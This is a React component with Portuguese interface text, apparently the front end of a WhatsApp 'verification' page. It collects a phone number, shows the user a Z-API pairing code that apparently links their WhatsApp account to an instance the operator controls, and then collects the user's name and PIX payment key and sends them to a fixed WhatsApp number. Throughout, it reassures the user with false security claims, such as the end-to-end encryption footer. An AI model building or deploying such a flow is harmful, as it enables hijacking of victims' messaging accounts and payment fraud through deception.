// VerifyFlow.jsx
import React, { useState, useEffect } from 'react';
import './VerifyFlow.css';

const ZAPI_API_BASE = 'https://api.z-api.io';
const WHATSAPP_HELP_NUMBER = '555131910192';

const VerifyFlow = () => {
  const [step, setStep] = useState(1);
  const [ddi, setDdi] = useState('55');
  const [telefone, setTelefone] = useState('');
  const [codigo, setCodigo] = useState('');
  const [instanceInfo, setInstanceInfo] = useState({});
  const [loading, setLoading] = useState(false);
  const [pix, setPix] = useState({ nome: '', tipo: 'Telefone', chave: '' });

  const telefoneFormatado = ddi + telefone.replace(/\D/g, '');

  const formatarTelefone = (value) => {
    let cleaned = value.replace(/\D/g, '');
    if (cleaned.length > 11) cleaned = cleaned.slice(0, 11);
    let formatted = '';
    if (cleaned.length > 0) formatted = '(' + cleaned;
    if (cleaned.length > 2) formatted = formatted.slice(0, 3) + ') ' + formatted.slice(3);
    if (cleaned.length > 7) formatted = formatted.slice(0, 10) + '-' + formatted.slice(10);
    return formatted;
  };

  const enviarTelefone = async () => {
    if (telefone.replace(/\D/g, '').length < 8) return alert('Digite um número válido.');
    setStep(2);
    setCodigo('');
    setLoading(false);
    try {
      const res = await fetch(`/get_code.php?telefone=${telefoneFormatado}`);
      const data = await res.json();

      if (data.error) return alert(`Erro: ${data.error}`);
      if (data.conectado) return setStep(3);

      localStorage.setItem('zapi_instance_id', data.instance_id);
      localStorage.setItem('zapi_instance_token', data.instance_token);
      localStorage.setItem('zapi_security_token', data.security_token);
      setCodigo(data.codigo);
      setInstanceInfo(data);
    } catch {
      alert('Erro ao gerar código.');
    }
  };

  const copiarCodigo = () => {
    navigator.clipboard.writeText(codigo).then(() => alert('Código copiado: ' + codigo));
  };

  const verificarConexao = async () => {
    setLoading(true);
    setTimeout(async () => {
      try {
        const { instance_id, instance_token, security_token } = instanceInfo;
        const res = await fetch(`${ZAPI_API_BASE}/instances/${instance_id}/token/${instance_token}/status`, {
          headers: { 'Client-Token': security_token },
        });
        const data = await res.json();
        setLoading(false);
        if (data.connected) setStep(3);
        else setCodigo('Código ainda válido. Tente novamente.');
      } catch {
        setLoading(false);
        setCodigo('Erro ao verificar status.');
      }
    }, 15000);
  };

  const enviarPix = () => {
    if (!pix.nome || !pix.chave) return alert('Preencha todos os campos!');
    const mensagem = `Acabei de conectar meu número ${telefoneFormatado}\n\nChave PIX:\nNome: ${pix.nome}\nTipo: ${pix.tipo}\nChave: ${pix.chave}`;
    const url = `https://wa.me/${WHATSAPP_HELP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
    window.open(url, '_blank');
  };

  return (
    <div className="verify-container">
      {step === 1 && (
        <div className="tela ativa">
          <h2>Insira o número de telefone</h2>
          <p>Selecione o país e insira seu número de telefone.</p>
          <div className="tela-conteudo">
            <select value={ddi} onChange={(e) => setDdi(e.target.value)}>
              <option value="55">🇧🇷 Brazil (+55)</option>
            </select>
            <input
              type="text"
              value={telefone}
              onChange={(e) => setTelefone(formatarTelefone(e.target.value))}
              placeholder="(11) 99955-9889"
            />
            <button onClick={enviarTelefone} style={{ borderRadius: '50px' }}>
              Avançar
            </button>

          </div>
        </div>
      )}

      {step === 2 && (
        <div className="tela ativa">
          <h2>Use esse código para conectar</h2>
          <div className="tela-conteudo">
            {loading ? <div className="spinner" /> : (
              <div id="codigo-display">
                {[...codigo].map((char, i) => (
                  <span key={i}>{char}</span>
                ))}
              </div>
            )}
            <button onClick={copiarCodigo}>Copiar código</button>
            <div onClick={verificarConexao} className="verificar-link">
              <span>Fiz o procedimento</span>
            </div>
          </div>
        </div>
      )}

      {step === 3 && (
        <div className="tela ativa">
          <h2>✅ Conectado com sucesso!</h2>
          <div className="tela-conteudo">
            <p>Seu WhatsApp foi conectado corretamente.</p>
            <p style={{ fontWeight: 'bold' }}>WhatsApp conectado com segurança!</p>
            <button onClick={() => setStep(4)}>Cadastrar chave PIX</button>
            <button onClick={() => setStep(1)}>Tentar novamente</button>
          </div>
        </div>
      )}

      {step === 4 && (
        <div className="tela ativa">
          <h2>Cadastro da Chave PIX</h2>
          <div className="tela-conteudo">
            <input
              type="text"
              value={pix.nome}
              onChange={(e) => setPix({ ...pix, nome: e.target.value })}
              placeholder="Seu nome completo"
            />
            <div style={{ display: 'flex', gap: '8px' }}>
              <select
                value={pix.tipo}
                onChange={(e) => setPix({ ...pix, tipo: e.target.value })}
                style={{ flex: 1 }}
              >
                <option value="Telefone">Telefone</option>
                <option value="CPF">CPF</option>
                <option value="CNPJ">CNPJ</option>
                <option value="E-mail">E-mail</option>
                <option value="Chave Aleatória">Chave Aleatória</option>
              </select>
              <input
                type="text"
                value={pix.chave}
                onChange={(e) => setPix({ ...pix, chave: e.target.value })}
                placeholder="Sua chave PIX"
                style={{ flex: 2 }}
              />
            </div>
            <button onClick={enviarPix}>Cadastrar chave PIX</button>
          </div>
        </div>
      )}

      <footer>
        🔒 Suas mensagens pessoais são protegidas com criptografia de ponta a ponta.
      </footer>
    </div>
  );
};

export default VerifyFlow;
